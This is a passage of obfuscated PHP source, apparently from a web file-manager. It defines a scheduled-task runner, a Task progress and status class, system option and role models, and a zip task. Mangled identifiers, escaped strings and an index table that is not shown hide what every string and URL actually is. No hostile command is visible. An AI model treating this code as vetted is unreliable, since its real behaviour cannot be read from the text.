self::valueSet($Å¹ì“‘˜[826], $Å¹ì“‘˜[231]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($Å¹ì“‘˜[1741] => $Å¹ì“‘˜[231], $Å¹ì“‘˜[826] => $Å¹ì“‘˜[91])); self::log($Å¹ì“‘˜[1758]); } public static function taskSwitch() { $´­éıø— =& $_SERVER[ıÚ˜š²İ]; $Ü£¦ïÛİ = self::valueGet($´­éıø—[826]) == $´­éıø—[91] ? $´­éıø—[231] : $´­éıø—[91]; self::valueSet($´­éıø—[826], $Ü£¦ïÛİ); } public static function shutdownEvent() { $Ãß…¿ç¾ =& $_SERVER[ıÚ˜š²İ]; self::valueSet($Ãß…¿ç¾[1741], $Ãß…¿ç¾[231]); self::log($Ãß…¿ç¾[1759]); } public static function config($Ò÷ÎÛ’, $µÛ¸îş€) { self::valueSet($_SERVER[ıÚ˜š²İ][826], $Ò÷ÎÛ’); } private static function taskRunAll() { $¬Şö—çó =& $_SERVER[ıÚ˜š²İ]; $¸¹ş“âª = timeFloat(); $¤ê¸ÊÒÖ = Model($¬Şö—çó[1760])->listData(); $Ç±ÅÑßû = count($¤ê¸ÊÒÖ); for ($¨†şßøŠ = 0; $¨†şßøŠ < $Ç±ÅÑßû; $¨†şßøŠ++) { $‘ÑÏüÁè = $¤ê¸ÊÒÖ[$¨†şßøŠ]; if (!$‘ÑÏüÁè[$¬Şö—çó[477]] || $‘ÑÏüÁè[$¬Şö—çó[1761]] != $¬Şö—çó[91]) { continue; } if (!self::taskTimeCheck($‘ÑÏüÁè)) { continue; } self::taskRun($‘ÑÏüÁè); } Hook::trigger($¬Şö—çó[1762]); self::taskQueueRun($¸¹ş“âª); } private static function taskQueueRun($ìÅ±—ı¤) { $‚‹±Ê²§ = 10; while (!0) { $²îÅØ¸€ = TaskQueue::run(); if ($²îÅØ¸€ === !1) { break; } if (timeFloat() - $ìÅ±—ı¤ >= $‚‹±Ê²§) { break; } } } private static function taskTimeCheck($‚Ô—ÎâÙ) { $ãğ›á™Ä =& $_SERVER[ıÚ˜š²İ]; $Û±®±çˆ = json_decode($‚Ô—ÎâÙ[$ãğ›á™Ä[207]], !0); $Ù—¿¦ã© = intval($‚Ô—ÎâÙ[$ãğ›á™Ä[1742]]); $ØÇş˜èÂ = strtotime($ãğ›á™Ä[1763] . $Û±®±çˆ[$ãğ›á™Ä[1764]] . $ãğ›á™Ä[1765]) - strtotime($ãğ›á™Ä[1766]); $êà²°¢Ó = time() - strtotime(date($ãğ›á™Ä[1767]) . $ãğ›á™Ä[1768]); $†’Äà‘‹ = $êà²°¢Ó >= $ØÇş˜èÂ && $êà²°¢Ó <= $ØÇş˜èÂ + 3600; switch ($Û±®±çˆ[$ãğ›á™Ä[33]]) { case $ãğ›á™Ä[1769]: if (time() - $Ù—¿¦ã© < 3600 * 24 * 30) { return !1; } if ($Û±®±çˆ[$ãğ›á™Ä[1769]] == date($ãğ›á™Ä[1770]) && $†’Äà‘‹) { return !0; } break; case $ãğ›á™Ä[1771]: if (time() - $Ù—¿¦ã© < 3600 * 24 * 7) { return !1; } $íæá›ÁÊ = date($ãğ›á™Ä[1772]) == 0 ? 7 : date($ãğ›á™Ä[1772]); if ($Û±®±çˆ[$ãğ›á™Ä[1771]] == $íæá›ÁÊ && $†’Äà‘‹) { return !0; } break; case $ãğ›á™Ä[1764]: if (time() - $Ù—¿¦ã© < 3600 * 24) { return !1; } if ($†’Äà‘‹) { return !0; } break; case $ãğ›á™Ä[1773]: if (time() - $Ù—¿¦ã© >= floatval($Û±®±çˆ[$ãğ›á™Ä[1773]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $Á ­Ÿœ =& $_SERVER[ıÚ˜š²İ]; static $Š£ê¿—´ = 0; $‹‡—µ´¾ = 300; if (!$Š£ê¿—´) { $Š£ê¿—´ = time(); } if (time() - $Š£ê¿—´ < $‹‡—µ´¾) { return; } $Š£ê¿—´ = time(); $àì¶±– = Model($Á ­Ÿœ[581])->db($Á ­Ÿœ[12]); if ($àì¶±–) { $àì¶±–->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($Á ­Ÿœ[1774], $Á ­Ÿœ[1775]); die; } } public static function taskRun($ÕŠ˜”ğ©) { $­‹Ò£ÂÌ =& $_SERVER[ıÚ˜š²İ]; self::log($­‹Ò£ÂÌ[1776] . $ÕŠ˜”ğ©[$­‹Ò£ÂÌ[477]] . $­‹Ò£ÂÌ[1777] . $ÕŠ˜”ğ©[$­‹Ò£ÂÌ[32]] . $­‹Ò£ÂÌ[1778] . $ÕŠ˜”ğ©[$­‹Ò£ÂÌ[1779]]); Model($­‹Ò£ÂÌ[1760])->run($ÕŠ˜”ğ©[$­‹Ò£ÂÌ[477]]); $ºÓ²æÏ = timeFloat(); $©€·Êš¬ = $­‹Ò£ÂÌ[12]; switch ($ÕŠ˜”ğ©[$­‹Ò£ÂÌ[33]]) { case $­‹Ò£ÂÌ[384]: $Á¶ªğµÊ = url_request($ÕŠ˜”ğ©[$­‹Ò£ÂÌ[1779]], $­‹Ò£ÂÌ[1517], !1, !1, !1, !1, 10); if ($Á¶ªğµÊ[$­‹Ò£ÂÌ[826]]) { $©€·Êš¬ = strlen($Á¶ªğµÊ[$­‹Ò£ÂÌ[1301]]); } break; case $­‹Ò£ÂÌ[1780]: $©€·Êš¬ = Hook::apply($ÕŠ˜”ğ©[$­‹Ò£ÂÌ[1779]]); default: break; } Model($­‹Ò£ÂÌ[1781])->add(array($­‹Ò£ÂÌ[1782] => $­‹Ò£ÂÌ[12], $­‹Ò£ÂÌ[1783] => $­‹Ò£ÂÌ[231], $­‹Ò£ÂÌ[33] => $­‹Ò£ÂÌ[1784] . $ÕŠ˜”ğ©[$­‹Ò£ÂÌ[477]], $­‹Ò£ÂÌ[1785] => json_encode(array($­‹Ò£ÂÌ[32] => $ÕŠ˜”ğ©[$­‹Ò£ÂÌ[32]], $­‹Ò£ÂÌ[1786] => timeFloat() - $ºÓ²æÏ, $­‹Ò£ÂÌ[832] => $©€·Êš¬)))); $à³Œæ‰É = $©€·Êš¬ ? $­‹Ò£ÂÌ[1787] . $©€·Êš¬ : $­‹Ò£ÂÌ[12]; self::log($­‹Ò£ÂÌ[1788] . $ÕŠ˜”ğ©[$­‹Ò£ÂÌ[477]] . $­‹Ò£ÂÌ[178] . $à³Œæ‰É); return !0; } public static function valueGet($ü›±ˆâ) { $Ğ·ßüŞï =& $_SERVER[ıÚ˜š²İ]; $Øë¡¸²¯ = $Ğ·ßüŞï[1789]; $áüª©¬ = Model($Ğ·ßüŞï[510])->get($ü›±ˆâ, $Øë¡¸²¯); if (is_null($áüª©¬)) { Model($Ğ·ßüŞï[510])->set($Ğ·ßüŞï[826], $Ğ·ßüŞï[91], $Øë¡¸²¯); Model($Ğ·ßüŞï[510])->set($Ğ·ßüŞï[1741], $Ğ·ßüŞï[231], $Øë¡¸²¯); $áüª©¬ = Model($Ğ·ßüŞï[510])->get($ü›±ˆâ, $Øë¡¸²¯); } return $áüª©¬; } private static function valueSet($ıÀ±Û‡ò, $êÍšæ³Ğ = false) { $ß¨Ì¿¼ =& $_SERVER[ıÚ˜š²İ]; $·»¦ç‰š = $ß¨Ì¿¼[1790]; CacheLock::lock($·»¦ç‰š); $úàÊ¨òÙ = Model($ß¨Ì¿¼[510])->set($ıÀ±Û‡ò, $êÍšæ³Ğ, $ß¨Ì¿¼[1789]); CacheLock::unlock($·»¦ç‰š); return $úàÊ¨òÙ; } protected static function log($ÄÂ‡ˆş) { write_log($ÄÂ‡ˆş, $_SERVER[ıÚ˜š²İ][1775]); } private static function cacheClear() { $ÔîÌŸñ =& $_SERVER[ıÚ˜š²İ]; Cache::clearMemory(Model($ÔîÌŸñ[510])->cacheKey($ÔîÌŸñ[1789])); Cache::clearMemory(Model($ÔîÌŸñ[510])->cacheKey($ÔîÌŸñ[1791])); Model($ÔîÌŸñ[1760])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\162\165\156\x6e\x69\156\147"; const STATYS_KILL = "\153\151\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ ¹¬Ó‚, $àû…Œ¤ = '', $üŠÒñ­¯ = 0, $ğÃ›¶Á = '') { $÷àáŸŞ¯ =& $_SERVER[ıÚ˜š²İ]; if (self::get($ ¹¬Ó‚)) { return; } $this->task = array($÷àáŸŞ¯[477] => $ ¹¬Ó‚, $÷àáŸŞ¯[1792] => USER_ID, $÷àáŸŞ¯[1680] => $ğÃ›¶Á, $÷àáŸŞ¯[528] => $÷àáŸŞ¯[12], $÷àáŸŞ¯[33] => $àû…Œ¤, $÷àáŸŞ¯[1154] => $÷àáŸŞ¯[12], $÷àáŸŞ¯[1152] => $üŠÒñ­¯, $÷àáŸŞ¯[1793] => 0, $÷àáŸŞ¯[1794] => 0, $÷àáŸŞ¯[1795] => 0, $÷àáŸŞ¯[1796] => timeFloat(), $÷àáŸŞ¯[1797] => 0, $÷àáŸŞ¯[1798] => 0, $÷àáŸŞ¯[1799] => 0, $÷àáŸŞ¯[1800] => 0, $÷àáŸŞ¯[826] => $÷àáŸŞ¯[1741]); $GLOBALS[$÷àáŸŞ¯[1801]] = 1; Hook::bind($÷àáŸŞ¯[1745], array($this, $÷àáŸŞ¯[1802])); Hook::bind($÷àáŸŞ¯[1803], array($this, $÷àáŸŞ¯[1804])); $this->startAfter(); Hook::trigger($÷àáŸŞ¯[1805], $this->task); $this->task[$÷àáŸŞ¯[1798]] = timeFloat(); } public function end($Ş×­Ù¯è = '') { $ÇºÎ°î° =& $_SERVER[ıÚ˜š²İ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ÇºÎ°î°[1798]]) { self::valueSet($this->task[$ÇºÎ°î°[477]], !1); } $this->isEnd = !0; if ($Ş×­Ù¯è) { $this->task[$ÇºÎ°î°[528]] = $Ş×­Ù¯è; } self::log($ÇºÎ°î°[1806] . $this->task[$ÇºÎ°î°[477]] . $ÇºÎ°î°[1807] . sprintf($ÇºÎ°î°[934], timeFloat() - $this->task[$ÇºÎ°î°[1796]]) . $ÇºÎ°î°[1808]); Hook::unbind($ÇºÎ°î°[1745], array($this, $ÇºÎ°î°[1802])); Hook::unbind($ÇºÎ°î°[1803], array($this, $ÇºÎ°î°[1804])); $this->endAfter(); $ËİÕö = $this->task; $this->task = !1; Hook::trigger($ÇºÎ°î°[1809], $ËİÕö); } public function update($Ÿè¸³û = 0, $›•°Íúä = false) { $‚Üç¸é× =& $_SERVER[ıÚ˜š²İ]; $¥Ö÷æªÅ =& $this->task; if (!$¥Ö÷æªÅ) { return; } $¥Ö÷æªÅ[$‚Üç¸é×[1793]] += $Ÿè¸³û; $¥Ö÷æªÅ[$‚Üç¸é×[1797]] = timeFloat(); if ($¥Ö÷æªÅ[$‚Üç¸é×[1152]]) { if ($¥Ö÷æªÅ[$‚Üç¸é×[1152]] < $¥Ö÷æªÅ[$‚Üç¸é×[1793]]) { $¥Ö÷æªÅ[$‚Üç¸é×[1152]] = $¥Ö÷æªÅ[$‚Üç¸é×[1793]]; } $¤¼Ô™Â = timeFloat() - $¥Ö÷æªÅ[$‚Üç¸é×[1796]] - $¥Ö÷æªÅ[$‚Üç¸é×[1799]]; if ($¤¼Ô™Â <= 0) { $¤¼Ô™Â = 0.001; } $¥Ö÷æªÅ[$‚Üç¸é×[1794]] = $¥Ö÷æªÅ[$‚Üç¸é×[1793]] / $¥Ö÷æªÅ[$‚Üç¸é×[1152]]; $¥Ö÷æªÅ[$‚Üç¸é×[1795]] = $¥Ö÷æªÅ[$‚Üç¸é×[1793]] / $¤¼Ô™Â; if ($¥Ö÷æªÅ[$‚Üç¸é×[1794]] > 0) { $¥Ö÷æªÅ[$‚Üç¸é×[1800]] = $¤¼Ô™Â * (1 - $¥Ö÷æªÅ[$‚Üç¸é×[1794]]) / $¥Ö÷æªÅ[$‚Üç¸é×[1794]]; } $¥Ö÷æªÅ[$‚Üç¸é×[1800]] = $¥Ö÷æªÅ[$‚Üç¸é×[1800]] <= 0 ? 0 : $¥Ö÷æªÅ[$‚Üç¸é×[1800]]; } $this->updateAfter(); $””ïÓ•Ğ = 0.2; if (timeFloat() - $¥Ö÷æªÅ[$‚Üç¸é×[1798]] < $””ïÓ•Ğ && !$›•°Íúä) { return; } $¬É¬–™æ = self::get($¥Ö÷æªÅ[$‚Üç¸é×[477]]); $ªé’ñ† = $¬É¬–™æ[$‚Üç¸é×[826]]; if ($ªé’ñ† == self::STATYS_KILL) { $ÄäŒú„¾ = array($‚Üç¸é×[1810] => LNG($‚Üç¸é×[1811]), $‚Üç¸é×[1311] => !1); Cache::set($‚Üç¸é×[1812] . $this->task[$‚Üç¸é×[477]], $ÄäŒú„¾, 30); $this->onKill(); $this->end(); die; } else { if ($ªé’ñ† == self::STATYS_STOP) { $ñŸïó¬« = 2; $¬É¬–™æ[$‚Üç¸é×[1799]] += $ñŸïó¬«; self::valueSet($¥Ö÷æªÅ[$‚Üç¸é×[477]], $¬É¬–™æ); sleep($ñŸïó¬«); $this->update(); return; } } $¥Ö÷æªÅ[$‚Üç¸é×[826]] = $ªé’ñ† ? $ªé’ñ† : $¥Ö÷æªÅ[$‚Üç¸é×[826]]; $¥Ö÷æªÅ[$‚Üç¸é×[1799]] = $¬É¬–™æ[$‚Üç¸é×[1799]] ? $¬É¬–™æ[$‚Üç¸é×[1799]] : 0; $¥Ö÷æªÅ[$‚Üç¸é×[1798]] = timeFloat(); Hook::trigger($‚Üç¸é×[1813], $¥Ö÷æªÅ); self::valueSet($¥Ö÷æªÅ[$‚Üç¸é×[477]], $¥Ö÷æªÅ); } public function onKillSet($ïù³æÎµ, $Ö™œ£…‹ = array()) { $this->onKillCall = array($ïù³æÎµ, $Ö™œ£…‹); } public function onKill() { $Í€ï¶ĞŒ =& $_SERVER[ıÚ˜š²İ]; self::log($Í€ï¶ĞŒ[1806] . $this->task[$Í€ï¶ĞŒ[477]] . $Í€ï¶ĞŒ[1814]); Hook::trigger($Í€ï¶ĞŒ[1815], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($©é¸¶÷š) { $£¼Œ³Ÿ™ =& $_SERVER[ıÚ˜š²İ]; Cache::set($£¼Œ³Ÿ™[1812] . $this->task[$£¼Œ³Ÿ™[477]], $©é¸¶÷š, 60); if (!is_array($©é¸¶÷š) || !$©é¸¶÷š[$£¼Œ³Ÿ™[1311]]) { self::log($£¼Œ³Ÿ™[1816] . json_encode($©é¸¶÷š)); } return $©é¸¶÷š; } public static function get($§¹èÇº¦) { $¾£–íÑÏ =& $_SERVER[ıÚ˜š²İ]; $ÎÍŸÀÖÔ = self::valueGet($§¹èÇº¦); if (is_array($ÎÍŸÀÖÔ) && $ÎÍŸÀÖÔ[$¾£–íÑÏ[1817]]) { $¡õ´ÑÖª = ActionApply($ÎÍŸÀÖÔ[$¾£–íÑÏ[1817]], array($ÎÍŸÀÖÔ)); $ÎÍŸÀÖÔ = is_array($¡õ´ÑÖª) ? $¡õ´ÑÖª : $ÎÍŸÀÖÔ; } return $ÎÍŸÀÖÔ; } public static function listData() { $¢ÜÖÎ¸æ = self::valueGet(); return array_sort_by($¢ÜÖÎ¸æ, $_SERVER[ıÚ˜š²İ][1796], !0); } public static function kill($§Çîşµ) { return self::changeStatus($§Çîşµ, self::STATYS_KILL); } public static function stop($ßæÉûúÒ) { return self::changeStatus($ßæÉûúÒ, self::STATYS_STOP); } public static function restart($ŠîÛ¿º) { return self::changeStatus($ŠîÛ¿º, self::STATYS_RUNNING); } public static function killAll() { $Î»©ÌÕ˜ =& $_SERVER[ıÚ˜š²İ]; $°‹ ïé = self::listData(); foreach ($°‹ ïé as $îŞ÷ Ç) { self::kill($îŞ÷ Ç[$Î»©ÌÕ˜[477]]); } sleep(2); foreach ($°‹ ïé as $îŞ÷ Ç) { self::valueSet($îŞ÷ Ç[$Î»©ÌÕ˜[477]], !1); } } private static function changeStatus($‰¥›´ÉŸ, $ö¤·†¼) { $³®Ñ±„ =& $_SERVER[ıÚ˜š²İ]; $¨â—ã’ = self::valueGet($‰¥›´ÉŸ); if (!$¨â—ã’) { return !1; } $¨â—ã’[$³®Ñ±„[826]] = $ö¤·†¼; self::valueSet($‰¥›´ÉŸ, $¨â—ã’); self::log($³®Ñ±„[1818] . $¨â—ã’[$³®Ñ±„[477]] . $³®Ñ±„[1819] . $ö¤·†¼); return !0; } public static function valueGet($ÑäÃÎµ– = false) { $¶Ô…ä•É =& $_SERVER[ıÚ˜š²İ]; if ($ÑäÃÎµ–) { $‘‡Üì¼© = Model($¶Ô…ä•É[522])->where(array($¶Ô…ä•É[97] => $ÑäÃÎµ–, $¶Ô…ä•É[33] => $¶Ô…ä•É[1161]))->find(); return $‘‡Üì¼© ? json_decode($‘‡Üì¼©[$¶Ô…ä•É[452]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ß°ÖÍØ¢ = false) { $İ››Œ»÷ =& $_SERVER[ıÚ˜š²İ]; $™šØ¬ˆê = array($İ››Œ»÷[33] => $İ››Œ»÷[1161]); if ($ß°ÖÍØ¢) { $™šØ¬ˆê[$İ››Œ»÷[1792]] = $ß°ÖÍØ¢; } $¤¼’—… = Model($İ››Œ»÷[522])->where($™šØ¬ˆê)->select(); $¤¼’—… = $¤¼’—… ? $¤¼’—… : array(); foreach ($¤¼’—… as $•óûå¸ => $àÇÄñ•) { $¤¼’—…[$•óûå¸] = json_decode($àÇÄñ•[$İ››Œ»÷[452]], !0); } return $¤¼’—…; } public static function valueSet($˜Ù»¯Ûæ, $Ø–ŒÍÑ©) { $”ù¶áöì =& $_SERVER[ıÚ˜š²İ]; if (!$Ø–ŒÍÑ©) { return Model($”ù¶áöì[522])->where(array($”ù¶áöì[97] => $˜Ù»¯Ûæ, $”ù¶áöì[33] => $”ù¶áöì[1161]))->delete(); } $¡¢šÊ¼« = json_encode($Ø–ŒÍÑ©); if (!$¡¢šÊ¼«) { ob_start(); var_dump($Ø–ŒÍÑ©); $¾ıÔ¯¿Ñ = ob_get_clean(); self::log($”ù¶áöì[1820] . json_encode_force($¾ıÔ¯¿Ñ)); } if (!$˜Ù»¯Ûæ || !$Ø–ŒÍÑ©[$”ù¶áöì[477]]) { return !1; } $›Çë¬¶õ = array($”ù¶áöì[33] => $”ù¶áöì[1161], $”ù¶áöì[1792] => USER_ID, $”ù¶áöì[97] => $˜Ù»¯Ûæ, $”ù¶áöì[452] => $¡¢šÊ¼«); $´¾¿¸ç” = $”ù¶áöì[1821]; CacheLock::lock($´¾¿¸ç”); Model($”ù¶áöì[522])->add($›Çë¬¶õ, array(), !0); CacheLock::unlock($´¾¿¸ç”); } public static function log($ØŠæİéŠ) { if (!GLOBAL_DEBUG) { return; } write_log($ØŠæİéŠ, $_SERVER[ıÚ˜š²İ][1822]); } } goto aæ¦Û·®; C„ô‰§” : class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\164\x65\x6d\x5f\x6f\x70\164\151\157\156"; protected $jsonField = array("\155\145\x6e\165", "\x72\x6f\154\x65", "\162\157\x6c\145\x47\x72\x6f\165\x70", "\x72\x65\147\x69\x73\164", "\145\155\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($ Ú³¥©) { return "\x53\x79\x73\164\145\155\x4f\x70\164\x69\x6f\156\x5f{$ Ú³¥©}"; } protected function optionDefault($¬Î«ğÉÌ = '') { $ÉáøŸë© =& $_SERVER[ıÚ˜š²İ]; if ($¬Î«ğÉÌ == $ÉáøŸë©[12]) { return $GLOBALS[$ÉáøŸë©[6]][$ÉáøŸë©[459]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\56\x72\157\x6c\x65\114\x69\x73\164"; public $field = array("\x6e\x61\155\145", "\x61\x75\164\x68", "\x6c\141\x62\x65\x6c", "\x64\x69\163\160\x6c\x61\171", "\x73\171\x73\x74\x65\155", "\x64\x65\x73\143", "\151\x67\156\157\162\x65\x45\x78\x74", "\x69\x67\x6e\x6f\x72\x65\x46\x69\154\x65\123\x69\172\x65", "\141\144\x6d\x69\x6e\x69\163\164\162\x61\164\157\x72", "\163\157\x72\164"); public function listData($ê…ËƒÆî = false, $ŒãüŠŞŒ = "\163\157\x72\x74", $Ôûì§©º = false) { $‘æ§Úç =& $_SERVER[ıÚ˜š²İ]; $Ëç†í”™ = parent::listData($ê…ËƒÆî, $ŒãüŠŞŒ, $Ôûì§©º); if (!$ê…ËƒÆî) { foreach ($Ëç†í”™ as $ØˆŞ§¦ó => $‘³“éÖÜ) { if ($‘³“éÖÜ[$‘æ§Úç[2203]] == 1) { $Ëç†í”™[$ØˆŞ§¦ó][$‘æ§Úç[528]] = LNG($‘æ§Úç[2478]); } } } return $Ëç†í”™; } public function update($©¦¹¥Üô, $¤³¤Ú) { $ğ»ÒÒÖ =& $_SERVER[ıÚ˜š²İ]; $£Œ‰¸Ü = parent::listData($©¦¹¥Üô); $±•£¹¤„ = $this->findByName($¤³¤Ú[$ğ»ÒÒÖ[32]]); if (!$£Œ‰¸Ü || $±•£¹¤„ && $±•£¹¤„[$ğ»ÒÒÖ[477]] != $£Œ‰¸Ü[$ğ»ÒÒÖ[477]]) { return !1; } if ($±•£¹¤„[$ğ»ÒÒÖ[2203]] == 1) { $¤³¤Ú = array($ğ»ÒÒÖ[32] => $¤³¤Ú[$ğ»ÒÒÖ[32]], $ğ»ÒÒÖ[2016] => $¤³¤Ú[$ğ»ÒÒÖ[2016]]); } $this->filterAuth($¤³¤Ú[$ğ»ÒÒÖ[489]]); return parent::update($©¦¹¥Üô, $¤³¤Ú); } public function remove($µõş½ÉĞ) { $–é ¢ƒŞ = parent::listData($µõş½ÉĞ); if (!$–é ¢ƒŞ || $–é ¢ƒŞ[$_SERVER[ıÚ˜š²İ][192]]) { return !1; } return parent::remove($µõş½ÉĞ); } public function add($ø—ôÈÌ) { $•³Ëçàû =& $_SERVER[ıÚ˜š²İ]; $€ÛÊ†¯ = $ø—ôÈÌ[$•³Ëçàû[32]]; if ($this->findByName($€ÛÊ†¯)) { return !1; } $óÛ£»¥ = array($•³Ëçàû[496] => $€ÛÊ†¯, $•³Ëçàû[1999] => $•³Ëçàû[12], $•³Ëçàû[1995] => $•³Ëçàû[2003], $•³Ëçàû[2479] => 1, $•³Ëçàû[1998] => 0, $•³Ëçàû[2480] => 0, $•³Ëçàû[1997] => $this->getSort()); $ø—ôÈÌ = array_merge($óÛ£»¥, $ø—ôÈÌ); $this->filterAuth($ø—ôÈÌ[$•³Ëçàû[489]]); return parent::insert($ø—ôÈÌ); } private function getSort() { $á‰Â¸ó» =& $_SERVER[ıÚ˜š²İ]; $·¿ò¤£¢ = parent::listData(); $£ôÉ˜Ëæ = array_to_keyvalue($·¿ò¤£¢, $á‰Â¸ó»[12], $á‰Â¸ó»[2017]); return empty($£ôÉ˜Ëæ) ? 0 : max($£ôÉ˜Ëæ) + 1; } private function filterAuth(&$§¶ÄêÉ¿) { $ÌÓğøò =& $_SERVER[ıÚ˜š²İ]; $ÄŒšß¶Û = array(); $‚Ğ¬ËÄ = array_filter(explode($ÌÓğøò[50], $§¶ÄêÉ¿)); foreach ($‚Ğ¬ËÄ as $§¶ÄêÉ¿) { $â¶½œ‡ = explode($ÌÓğøò[10], $§¶ÄêÉ¿); if ($â¶½œ‡[0] == $ÌÓğøò[2481] && $â¶½œ‡[1] != $ÌÓğøò[1289]) { $ÒâÔ³Û = $â¶½œ‡[0] . $ÌÓğøò[10] . $â¶½œ‡[1] . $ÌÓğøò[2482]; if (!in_array($ÒâÔ³Û, $‚Ğ¬ËÄ)) { $ÄŒšß¶Û[] = $ÒâÔ³Û; } } $ÄŒšß¶Û[] = $§¶ÄêÉ¿; } $§¶ÄêÉ¿ = implode($ÌÓğøò[50], $ÄŒšß¶Û); } public function findRoleDefault() { $¬ÈãÕ£© =& $_SERVER[ıÚ˜š²İ]; $ä©Û¥æº = parent::listData(); $æ¾•±Œò = !1; foreach ($ä©Û¥æº as $¹Ô–Çõ½) { if (!$¹Ô–Çõ½ || $¹Ô–Çõ½[$¬ÈãÕ£©[2015]] == $¬ÈãÕ£©[231] || $¹Ô–Çõ½[$¬ÈãÕ£©[2203]] == 1) { continue; } if (strstr($¹Ô–Çõ½[$¬ÈãÕ£©[489]], $¬ÈãÕ£©[2483])) { continue; } if (!strstr($¹Ô–Çõ½[$¬ÈãÕ£©[489]], $¬ÈãÕ£©[2484])) { continue; } if (!$æ¾•±Œò) { $æ¾•±Œò = $¹Ô–Çõ½; continue; } $ì§¶†×û = explode($¬ÈãÕ£©[50], $æ¾•±Œò[$¬ÈãÕ£©[489]]); $ÅÜ«Ğ¢ = explode($¬ÈãÕ£©[50], $¹Ô–Çõ½[$¬ÈãÕ£©[489]]); if (count($ì§¶†×û) > count($ÅÜ«Ğ¢)) { $æ¾•±Œò = $¹Ô–Çõ½; } } return $æ¾•±Œò ? $æ¾•±Œò[$¬ÈãÕ£©[477]] : $¬ÈãÕ£©[12]; } public function sort($¦—ÚÙº, $¾³Û´ÓŸ) { return parent::update($¦—ÚÙº, $¾³Û´ÓŸ); } } goto C›ÑÒ¹ñ¢•; d˜š™Ù¥: class TaskZip extends TaskFileTransfer { protected function startAfter() { $îäØµü¢ =& $_SERVER[ıÚ˜š²İ]; parent::startAfter(); Hook::bind($îäØµü¢[1919], array($this, $îäØµü¢[1909])); Hook::bind($îäØµü¢[1911], array($this, $îäØµü¢[1912])); $€ÏÑ¨¸ù =& $this->task; $€ÏÑ¨¸ù[$îäØµü¢[1913]] = $îäØµü¢[1293]; if (!$€ÏÑ¨¸ù[$îäØµü¢[1680]]) { $€ÏÑ¨¸ù[$îäØµü¢[1680]] = LNG($îäØµü¢[1920]); } } protected function endAfter() { $„ÕÏªºß =& $_SERVER[ıÚ˜š²İ]; parent::endAfter(); Hook::unbind($„ÕÏªºß[1919], array($this, $„ÕÏªºß[1909])); Hook::unbind($„ÕÏªºß[1911], array($this, $„ÕÏªºß[1912])); } public function updateAfter() { $ù¢×àçÛ =& $_SERVER[ıÚ˜š²İ]; $œøÏ¤„î =& $this->task; if (!$œøÏ¤„î[$ù¢×àçÛ[1152]] || !$œøÏ¤„î[$ù¢×àçÛ[840]]) { return; } if ($œøÏ¤„î[$ù¢×àçÛ[1913]] == $ù¢×àçÛ[1293]) { $‰¯îÈÒ¯ = $œøÏ¤„î[$ù¢×àçÛ[1847]]; if ($œøÏ¤„î[$ù¢×àçÛ[1848]] != $ù¢×àçÛ[1293]) { $‰¯îÈÒ¯ = 0; } $£Ã½Â«› = ($œøÏ¤„î[$ù¢×àçÛ[1851]] + $‰¯îÈÒ¯) / $œøÏ¤„î[$ù¢×àçÛ[840]]; $œøÏ¤„î[$ù¢×àçÛ[1794]] = $£Ã½Â«› * 0.3; } else { if ($œøÏ¤„î[$ù¢×àçÛ[1913]] == $ù¢×àçÛ[390]) { $£Ã½Â«› = $œøÏ¤„î[$ù¢×àçÛ[1793]] / $œøÏ¤„î[$ù¢×àçÛ[1152]]; $œøÏ¤„î[$ù¢×àçÛ[1794]] = 0.3 + $£Ã½Â«› * 0.5; } else { if ($œøÏ¤„î[$ù¢×àçÛ[1913]] == $ù¢×àçÛ[110]) { $£Ã½Â«› = 0; if ($œøÏ¤„î[$ù¢×àçÛ[1846]]) { $£Ã½Â«› = $œøÏ¤„î[$ù¢×àçÛ[1847]] / $œøÏ¤„î[$ù¢×àçÛ[1846]]; } $œøÏ¤„î[$ù¢×àçÛ[1794]] = 0.3 + 0.5 + $£Ã½Â«› * 0.2; } } } if ($œøÏ¤„î[$ù¢×àçÛ[1794]] > 0) { $Õ€ÒØ™ = timeFloat() - $œøÏ¤„î[$ù¢×àçÛ[1796]] - $œøÏ¤„î[$ù¢×àçÛ[1799]]; $œøÏ¤„î[$ù¢×àçÛ[1800]] = $Õ€ÒØ™ * (1 - $œøÏ¤„î[$ù¢×àçÛ[1794]]) / $œøÏ¤„î[$ù¢×àçÛ[1794]]; } } public function copyFileStart($¶ö÷ÇÎ›, $¶´ˆøŞ, $ûà„ä‘º, $ƒå½êŞ, $ü¹Ò¬û‹, $î”ª‹ò) { $Èâ•Úàø =& $_SERVER[ıÚ˜š²İ]; parent::copyFileStart($¶ö÷ÇÎ›, $¶´ˆøŞ, $ûà„ä‘º, $ƒå½êŞ, $ü¹Ò¬û‹, $î”ª‹ò); $¿·ê…Œü =& $this->task; if ($¿·ê…Œü[$Èâ•Úàø[1913]] == $Èâ•Úàø[390]) { $¿·ê…Œü[$Èâ•Úàø[1913]] = $Èâ•Úàø[110]; } $this->update(); } public function copyFileEnd($ôé÷÷í, $…ÅÚÍÑ, $Âõ¬şîĞ, $ÔÇ°·­Ê, $ó˜óÑĞ¦, $Ë¡¹˜âç) { $«ÒŞÛ¼ =& $_SERVER[ıÚ˜š²İ]; $‹µïŞ¢ß =& $this->task; $‹µïŞ¢ß[$«ÒŞÛ¼[1847]] = $‹µïŞ¢ß[$«ÒŞÛ¼[1846]]; $‹µïŞ¢ß[$«ÒŞÛ¼[1851]] += $‹µïŞ¢ß[$«ÒŞÛ¼[1846]]; $‹µïŞ¢ß[$«ÒŞÛ¼[1848]] = $«ÒŞÛ¼[12]; $this->update(); } public function zipEvent($û¨äÒË, $ãğØÙÄ‰, $øßªÀéÖ, $àâ“îäÒ) { $…ÃàŞÚ³ =& $_SERVER[ıÚ˜š²İ]; 